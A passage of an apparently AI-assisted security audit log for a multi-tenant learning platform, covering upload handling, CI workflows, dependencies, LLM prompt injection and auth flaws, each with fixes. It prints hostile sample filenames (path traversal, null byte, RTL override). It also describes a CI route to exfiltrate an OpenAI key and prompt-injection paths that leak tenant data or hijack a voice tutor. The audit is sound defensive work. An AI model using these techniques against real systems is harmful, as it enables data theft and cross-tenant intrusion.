| 2 | HIGH | `POST /ai/ingest-pdf` | `routes/ai/ingest-pdf.ts:144, 183` | Path traversal/null-byte/RTL-override in storage key. `originalFilename = file.name` interpolated raw into `${institutionId}/${summaryId}/${originalFilename}` — NO `.replace(/[^a-z0-9._-]/g, ...)` (the sanitize pattern present in `routes-storage.ts:151-154` and `routes-models.ts:323-326`). `../../escape.pdf`, `evil%00.html`, `\u202Efdp.exe` land in bucket as-is. RLS-bound members served polyglot via signed URLs. **Iter 1's "filename sanitize handles traversal" (#239) did NOT cover this file.** | Reuse sanitize routine: `originalFilename.toLowerCase().replace(/[^a-z0-9._-]/g, '-').replace(/-+/g,'-').substring(0,80)`. Reject if final path resolves outside `${institutionId}/${summaryId}/`. |
| 3 | HIGH | `POST /ai/ingest-pdf` | `routes/ai/ingest-pdf.ts:101-115` | NO PDF content sanitization. Accepts any `application/pdf` ≤10 MB. No scan for `/JavaScript`, `/JS`, `/Launch`, `/EmbeddedFile`, `/OpenAction`. Malicious PDF delivers exploits via PDF.js / Adobe Reader on download, plus prompt-injection content fed to Gemini extraction (compounds iter 3 #3-#4). | Parse with Deno PDF lib (`pdf-lib`); reject if AcroForm or any of the listed actions present. Failing that, set `Content-Disposition: attachment` and document downloads from `pdf-sources` may be hostile. |
| 4 | MEDIUM | both bucket routes | `routes-storage.ts:35-53` + `routes-models.ts:244-261` + `ImageUploadDialog.tsx:101-106` + `tiptap-editor/image-handling.ts:25-27` | `ensureBucket()` only sets `allowedMimeTypes`/`fileSizeLimit` on **first creation**; in prod buckets pre-exist and these are never enforced. Frontend `ImageUploadDialog` + TipTap `image-handling` write to `axon-images` directly via user's Supabase JS client — bypassing backend allowlist entirely. `<input accept="image/*">` admits `image/svg+xml` → SVG-XSS stored and served. | Verify prod bucket configs (`select id, allowed_mime_types, file_size_limit, public from storage.buckets`). Either (a) enforce MIME+size+script-strip on bucket + explicit SVG-block, or (b) route ALL writes through `POST /storage/upload`. Restrict `accept="image/jpeg,image/png,image/webp,image/gif"`. |
| 5 | MEDIUM | `POST /upload-model-3d` | `routes-models.ts:303-313` | GLB magic-byte verification has `try { ... } catch { /* skip */ }` — any read failure silently bypasses validation. `.gltf` (JSON) path has no structural validation (no `asset.version` check, no recursion bound on `nodes[].children`). Polyglot `.gltf` containing arbitrary JSON, served as `application/json` from public bucket. | Treat read-failure as 400. For `.gltf`: parse JSON, assert `asset.version` exists, cap `nodes.length` + depth. |

### File upload verified clean
- `POST /storage/upload`: storage path server-derived (`folder/userId/timestamp-random.ext`); template-literal ext token cannot escape folder (no `..` reachable; risk is only the user-controlled trailing ext token).
- `POST /upload-model-3d`: filename sanitized, path server-derived, max 100 MB, ext allowlist `.glb/.gltf` (modulo finding #5).
- Frontend client-side validators are UX only — confirmed not security boundary.
- No `eval`/`Function` of uploaded content; no SVG accepted by backend allowlists.
- `pdf-sources` bucket is `public:false` with RLS by institution membership.
- No HTML rendered from upload bytes server-side.

### File upload notes
- **No antivirus / content scanning anywhere** — every upload lands raw bytes in Storage. Recommend async post-upload Worker that re-fetches, scans, quarantines.
- **No image re-encoding** — EXIF script payloads, ICC profile abuse, progressive-JPEG polyglots survive intact.
- `axon-images` is `public:true`; content via `getPublicUrl()` (no signing). Combined with #1+#4, hostile MIME content fetchable by URL guessers.
- Bucket-level `allowedMimeTypes` cannot be confirmed from repo state; needs runtime `select` on `storage.buckets`.

### Iter 5 totals
- **3 HIGH** (polyglot bytes, PDF traversal filename, PDF active content)
- **4 MEDIUM** (bucket allowlist bypass, GLB magic-byte try/catch, Cache-Control auth, COOP/COEP missing)

---

## Iteration 4 — 2026-04-17 — CI/CD supply chain + deps audit

**Status:** ✓ complete (GH Actions + deps)

### GitHub Actions supply chain (security-scanner)

| # | Severity | Repo | File | Issue | Fix |
|---|---|---|---|---|---|
| 1 | HIGH | frontend | `pr-opened-review.yml:60-63 + 77-87` | Pwn-request-equivalent: `pull_request` + checkout of `refs/pull/<n>/merge` (untrusted PR HEAD) followed by `npm ci`, `npm test`, `npm run build`. With `synchronize` trigger + `pull-requests: write` + `OPENAI_API_KEY` in env, fork/contributor branch can execute arbitrary code via post-install scripts and exfiltrate `OPENAI_API_KEY`, then post arbitrary content into PR comments. Not `pull_request_target` so GITHUB_TOKEN read-only on forks, but OpenAI secret still mounted. | Restrict AI-review job to same-repo PRs (`if: github.event.pull_request.head.repo.full_name == github.repository`), OR split into untrusted job (no secrets, runs npm test/build) + trusted job via `workflow_run` (reads artifacts, calls OpenAI). Add `npm ci --ignore-scripts`. |
| 2 | MEDIUM | frontend | `pr-opened-review.yml:145-147, 259-261` | Inline expression injection pattern: `${{ steps.install.outcome }}` interpolated into `script:` body of `actions/github-script`. Step outcomes are GitHub-controlled today (not exploitable), but pattern would become RCE if a future edit interpolates `${{ github.event.pull_request.title }}` / `pr.body`. | Move every `${{ … }}` into step's `env:` block, read with `process.env.X`. Stop string-interpolating `${{ }}` into `script:`. |
| 3 | MEDIUM | both | All workflows | `trufflesecurity/trufflehog@v3.93.8` (security-scan.yml:74,82) and verified-org actions pinned to mutable tags. TruffleSecurity NOT in verified-org allowlist + had supply-chain incidents — MUST be SHA-pinned. Verified-org pins acceptable but defense-in-depth recommend SHA. | SHA-pin `trufflesecurity/trufflehog` to 40-char commit. Add Dependabot `package-ecosystem: github-actions`. |
| 4 | MEDIUM | frontend | `sprint-preflight.yml` | No `permissions:` block → inherits repo default (likely `contents: write` on PR events). Test-gate/test only grant `contents: read`; sprint-preflight runs PRs with no narrowing. | Add `permissions: { contents: read }` at workflow level. |
| 5 | LOW-MED | frontend | `security-scan.yml:31, test.yml:51, test-gate.yml:109, pr-opened-review.yml:75` | `npm install`/`npm ci` runs with install scripts enabled on PR-triggered jobs. Combined with #1 = the actual RCE primitive. | `--ignore-scripts` for any job on untrusted refs that doesn't need native builds. |

### GH Actions verified clean
- `backend/deploy.yml`: push:main + paths only, no PR trigger, secrets via env not third-party `with:`.
- `backend/deploy-migrations.yml`: exemplary — hardcoded PROJECT_ID, env-var pattern, `permissions: contents:read / issues:write / actions:none / id-token:none`, manual-approval environment, concurrency lock, no inline `${{ }}` in shell.
- `backend/integration-tests.yml`: push:main only, no fork PR exposure.
- `backend/test-gate.yml`: `permissions: contents:read / checks:write`, secrets only in env.
- `frontend/security-scan.yml` (CodeQL + audit): `permissions: contents:read / security-events:write`, no secret in third-party `with:`.
- No `pull_request_target` anywhere.
- No self-hosted runners (all `ubuntu-latest`).
- No cron auto-deploy (only `security-scan` cron, read-only).
- No `gh pr comment` echoing secrets; no `set -x` / `--debug`.
- Cache keys derived from `hashFiles('package-lock.json')` / `deno.lock` — no PR-attacker key control.

### GH Actions notes
- Finding #1 = most exploitable in this audit. OPENAI_API_KEY is high-value, mounting on unvetted-PR job = same threat model as `pull_request_target`. Escalate.
- Cache poisoning by content on PR-triggered writes: GitHub scopes by ref but PR landing on main can promote a poisoned cache. Low likelihood with lockfile-keyed cache; informational.

### Dependency / supply-chain audit

**npm audit (frontend)**: 0 critical, 0 high, **1 moderate**, 0 low / 650 deps total

| # | Severity | Repo | Dep | Issue | Fix |
|---|---|---|---|---|---|
| 1 | MODERATE | frontend | `dompurify ≤3.3.3` | GHSA-39q2-94rc-95cp — `ADD_TAGS` bypasses `FORBID_TAGS` via short-circuit eval (CWE-783). Declared `^3.3.3` permits 3.3.4+, but lockfile pins old. **Note: PR #439 bumps to 3.3.4/3.4.0**; merge resolves. | Merge PR #439 (already adds rel-merge fix from `b72bbaf0`) — bumps to safe version. |
| 2 | MEDIUM | backend | `import "npm:hono"` + `import "npm:@supabase/supabase-js"` (~70 sites) | Bare `npm:` specifiers without version. Deno deploy refetches latest at deploy time → drift between local and prod, supply-chain risk if either pkg ships a malicious update before review. | Pin to specific version: `npm:hono@4.x.y`, `npm:@supabase/supabase-js@2.x.y`. Centralize in a `lib/deps.ts` re-export. |
| 3 | MEDIUM | backend | `https://deno.land/std/crypto/mod.ts`, `https://deno.land/std/encoding/hex.ts` (auto-ingest.ts L40-41) | NO version pin → fetches HEAD. Fragile, plus `deno.land/std` is the deprecated registry (jsr.io is canonical). | Pin to `@0.224.0` (matches existing pinned imports) or migrate to `jsr:@std/crypto`, `jsr:@std/encoding`. |
| 4 | LOW | backend | Mixed `std` versions: `@0.224.0` (production) vs `@0.208.0` (test) | Inconsistency — test fixtures may exercise different std behavior than prod code. | Align both to `@0.224.0`. |
| 5 | LOW | frontend | 27 `@radix-ui/*` + 10 `@tiptap/*` packages from same orgs | Single-org concentration → blast radius if either compromised. Currently safe. | Acceptable concentration trade-off; flag for awareness only. |

### Deps notes
- No known-malicious / typosquat-prone packages (`is-promise`, `event-stream`, `colors`, `node-ipc`, etc.) in frontend direct deps.
- Internal `@axon/design-system` exists locally but never imported by name; reserve `@axon` npm scope to prevent squatting.
- Recently-added (30d): `html-to-text@^9.0.5` (Copilot autofix for CodeQL sanitization, 2026-04-07), `@testing-library/user-event@^14.6.1` (devDep, 2026-04-04). Both reputable.
- Backend has no `deno.json` lockfile → no `deno audit` possible. Recommend adding `deno.lock` to commit + re-running.
- Frontend `package.json` `"name": "@figma/my-make-file"` is unscrubbed Figma scaffold — cosmetic.

### Iter 4 totals
- **1 HIGH** (GH Actions OPENAI_API_KEY exfil)
- **6 MEDIUM** (4 GH Actions + dompurify + 2 backend deps unpinned)
- **3 LOW** (npm scripts on PR, std version mix, radix/tiptap concentration)

---

## Iteration 3 — 2026-04-16 — AI/LLM + auth flow

**Status:** ✓ complete (AI scan + auth flow scan)

### AI / LLM security (security-scanner)

| # | Severity | Category | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | HIGH | A01 RAG tenancy bypass | `routes/_messaging/tools-base.ts:355-366` (`handleAskAcademicQuestion`) | When `ragSearch` returns empty, fallback `db.from("summaries").select(...).eq("id", summaryId).single()` has **no institution filter**. `db` = `getAdminClient()` (telegram/tools.ts:269, whatsapp/tools.ts:248), so RLS bypassed. `summary_id` from LLM tool-call args, poisonable via prompt injection ("usá el resumen ID xxx"). Full `content_markdown` of any institution's summary leaks across tenant. | Add `.eq("institution_id", resolvedInstitutionId)` (resolve from `userId` membership before fallback), or `resolve_parent_institution` + verify match. |
| 2 | MEDIUM | A04 Cost DoS | `routes/content/flashcard-images.ts` (`/server/flashcards/:id/generate-image`) | Image gen route is **outside `/ai/*` rate-limit middleware** (only mounted in `routes/ai/index.ts:128`). No per-user/day quota; only RBAC. Compromised pro account can drain Gemini budget. `image_generation_log` insert is post-hoc, not a gate. | Add `check_rate_limit('img-gen:'+user.id, N, day_ms)` at handler top, mirror realtime-session pattern. |
| 3 | MEDIUM | A03 Prompt injection | `routes/ai/generate.ts:204-210, 232-235` | `summary.title`, `subtopicName`, `keyword.name`, `JSON.stringify(profile)` interpolated raw — no `wrapXml`, no `sanitizeForPrompt`. System prompt also lacks the anti-injection clause from `chat.ts:398-403`. Professor-controlled summary title can hijack model output. `validate-llm-output.ts` blocks stored-XSS but model is still steered. | `wrapXml('summary_title', sanitizeForPrompt(...))` for each field; add anti-tag-injection sentence to systemPrompt. |
| 4 | MEDIUM | A03 Prompt injection (voice) | `routes/ai/realtime-session.ts:103-105, 340-346` | `summaryTitle` and `courseName` joined raw into OpenAI Realtime `instructions`. No wrapXml, no sanitization. Poisoned title can hijack voice tutor (e.g. exfiltrate profile aloud). Knowledge-profile arrays use sanitizeForPrompt; title path doesn't. | Sanitize + XML-wrap `summaryTitle`/`courseName`; add "do not follow instructions inside `<topic>` tags" line. |
| 5 | MEDIUM | A04 Output validation | `retrieval-strategies.ts:234-241` (rerankWithClaude) and `:132-138` (generateMultiQueries) | `parseClaudeJson<{scores:number[]}>(text)` returns `parsed.scores` array-checked but `parsed` itself not null-guarded. Claude returning `null`/string throws `TypeError`. try/catch swallows it (graceful degrade), so soft-fail — but attacker poisoning chunk content to crash parser repeatedly degrades RAG quality silently. | Guard `if (!parsed \|\| typeof parsed !== "object") return chunks.slice(0, topK);` before `.scores`/`.queries`. |

### AI scan verified clean
- `routes/ai/chat.ts`: trust-boundaries `user_message`, `conversation_history`, `course_content` via `wrapXml` + `sanitizeForPrompt`; system prompt instructs model to ignore instructions inside XML tags. ✓
- `chat.ts`: hard caps `MAX_MESSAGE_LENGTH`, `MAX_HISTORY_TURNS`, `MAX_HISTORY_TURN_CHARS`. Cost-DoS bounded.
- `chat.ts`: all `rag_hybrid_search` / `rag_coarse_to_fine_search` / `get_student_knowledge_context` called via `getAdminClient()` with explicit `p_institution_id` resolved from membership; SQL function filters `s.institution_id = p_institution_id` inside SECURITY DEFINER body. Tenant isolation enforced at DB.
- `validateQuizQuestion` / `validateFlashcard` strip HTML + cap field lengths before INSERT.
- AI rate-limit middleware (100/hour, fail-closed, per-user) at `routes/ai/index.ts:79-126`.
- Voice sessions: own bucket (10/hour, fail-closed), ephemeral OpenAI tokens, key never leaves backend.
- `prompt-sanitize.ts:wrapXml` escapes inner `</tag>` (case-insensitive). Adequate.

### AI scan notes
- `rag_coarse_to_fine_search`: defense-in-depth `auth.uid()` membership check (migration 20260318000001:43-54) is **bypassed via service-role**. Backend `p_institution_id` correctness is the only tenant guard; fragile if a future caller forgets to resolve institution first.

### Auth flow audit (security-scanner)

| # | Severity | Side | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | HIGH | Backend | `routes/telegram/link.ts:91-120` | `verifyLinkCode` matches a 6-digit code against up to 200 active linking sessions with NO binding to submitting `chat_id`. Any chat winning the code-collision race becomes linked to victim's `user_id`; full TG tool surface (update_agenda, submit_review, ask_academic_question, etc.) executes as victim. 200 codes in 5-min window = reachable keyspace; per-chat rate-limit lets attackers rotate fresh chats. | Bind code to single submitting chat (hash+store `chat_id` with code, reject if verifying chat differs OR same code tried from >1 chat). Or use per-user 22+ char random token in `t.me/<bot>?start=<token>` deep-link instead of 6-digit shared. Add strict global rate-limit on `/start`+numeric per IP. |
| 2 | HIGH | Backend | `routes-auth.ts:136-165` | `POST /signup` auto-joins every new user as `student` to OLDEST active institution (`institutions WHERE is_active=true ORDER BY created_at LIMIT 1`). Multi-tenant deploy: anyone signing up gets real membership in tenant #1, granting read access to its content (memberships, institutions, courses, summaries). Classic priv-esc vector. | Remove auto-join entirely (admin must add membership), OR gate on signup-time invite token / institution slug, OR auto-join ONLY in single-tenant mode (env-flag). |
| 3 | MEDIUM | Backend | `routes/members/institutions.ts:37-80` | `POST /institutions` lets ANY authenticated user create an institution and become `owner` with no rate-limit. Self-serve SaaS may want this, but unbounded means attacker can spawn unlimited owner memberships (DB pressure, downstream owner-only endpoint abuse, billing/quota bypass). | Per-user creation cap (e.g. ≤3 institutions/24h) + per-IP rate-limit. Confirm with arquitecto whether self-serve is intended. |
| 4 | MEDIUM | Backend | `routes/_messaging/tools-base.ts:174-185, 216-223` (+ `routes/telegram/tools.ts:269`, `routes/whatsapp/tools.ts`) | TG/WA `executeToolCall` hands `getAdminClient()` (RLS-bypass) to `handleCheckProgress` / `handleGetSchedule`, which filter rows ONLY by `student_id = userId` (no `institution_id`). Same user with multi-inst memberships → results aggregate across tenants. Defense-in-depth lost: a future bug tainting `userId` (e.g. TG link-hijack per #1) reads any user's data unhindered by RLS. | Build user-scoped client from stored Supabase JWT for linked user, OR explicitly scope every read by `institution_id` resolved from `memberships`. At minimum `.eq("institution_id", ...)` on topic_progress / study_plan_tasks. |

### Auth flow verified clean
- JWT verification (`db.ts:121-149`): jose ES256 vs Supabase JWKS, `audience: "authenticated"`, expiry handled — no manual claim trust.
- `requireInstitutionRole` (`auth-helpers.ts:165-172`): correctly filters `user_id` AND `institution_id` AND `is_active=true`; fail-closed.
- `POST /memberships` + `PUT /memberships/:id`: gated by `requireInstitutionRole(MANAGEMENT_ROLES)` + `canAssignRole()` + role-hierarchy check + last-owner protection.
- No handler reads `role` from `req.body`/`req.query`.
- No `refresh_token` logged; `access_token` only in messaging-admin where masked via `maskToken()` before return.
- Frontend logout (`AuthContext.tsx:376-391`) clears all 4 keys + `supabase.auth.signOut()`.
- 401 interceptor (`api.ts:49-76,152-159`) clears state + redirects.
- API base URL hardcoded in `lib/config.ts:15`; no user input concatenated.
- Only `axon_access_token` is credential in localStorage; other `axon_*` keys = profile/membership state.
- `RequireAuth` + `RequireRole` use server-derived role (no client-only role trust).
- Telegram webhook secret + WhatsApp HMAC-SHA256 both verified via `timingSafeEqual`; refuse to start without env vars.

### Iter 3 critical interaction
**Findings #2 (signup auto-join) + #3 (free org create) compose**: attacker signs up → becomes student in tenant #1 + creates own tenant as owner → owner-role pivots in own tenant. Recommend arquitecto reviews multi-tenant model intent.

---

## Iteration 2 — 2026-04-16 — Frontend security scan

**Status:** ✓ complete

| # | Severity | Category | File:line | Issue | Fix |
|---|---|---|---|---|---|
| 1 | MEDIUM | A05 Misconfig / A03 Injection | `src/app/components/student/ViewerBlock.tsx:617-622` | `<iframe src={pdfUrl}>` without `sandbox` or `referrerPolicy`. `pdfUrl = c.url \|\| c.src` flows from arbitrary block content; if a malicious URL is ever stored (or storage CDN compromised), iframe runs same-origin scripts/forms in parent context. | Add `sandbox="allow-same-origin allow-scripts"` (or `sandbox=""` for true PDFs only) + `referrerPolicy="no-referrer"`. Validate `pdfUrl` matches Supabase storage origin allowlist. |

### Already-fixed verified
- DOMPurify auto-injects `rel="noopener noreferrer"` on `target="_blank"` (#439, `b72bbaf0`).
- LoginPage open-redirect via backslash (#447, `4fced961`).
- All 8 dynamic `dangerouslySetInnerHTML` sites pass through `sanitizeHtml()` (`ChunkRenderer.tsx:68`, `ReaderChunksTab.tsx:136`, `ReaderHeader.tsx:182`, `SummaryReaderBody.tsx:93`, `ViewerBlock.tsx:463/647`).
- All 3 JSX `target="_blank"` sites carry explicit `rel="noopener noreferrer"`.

### Verified clean (zero matches)
- `eval(`, `new Function(`, `Function('...')` = 0
- `window.open(...)` = 0
- `addEventListener('message', ...)` postMessage listeners = 0
- `href="javascript:..."` = 0
- `SERVICE_ROLE` / `service_role` references in frontend = 0
- JSX rendering of password/secret/token fields = 0
- `fetch(userInput)` / `axios.get(userInput)` open-SSRF = 0

### Notes
- `LoginPage.tsx:50` for *signup* path may still have `navigate('/', ...)` without re-validation — distinct from the fixed signin path. Worth a future spot-check but `'/'` is hardcoded so impact is nil.
- `localStorage.setItem('axon_access_token', ...)` is documented architectural decision (XSS-readable but pragmatic for SPA + Supabase).
- `chart.tsx:83` `dangerouslySetInnerHTML` with static `THEMES` constant — not user input. Safe.
- TipTap `handlePaste` only intercepts images; HTML/text passes through ProseMirror schema-driven sanitizer; saved HTML re-sanitized on read. Safe under current architecture.

### Iteration 1 totals
- **2 HIGH** (messaging-admin confused-deputy, institution_subscriptions writable by students)
- **2 HIGH SSRF** (telegram + whatsapp URL injection — ALSO HIGH; counted under security-scanner)
- **6 MEDIUM** (3 from each subagent)
- **1 LOW** (storage prefix substring check)
- **Total: 4 HIGH + 6 MEDIUM + 1 LOW = 11 findings ≥ low**


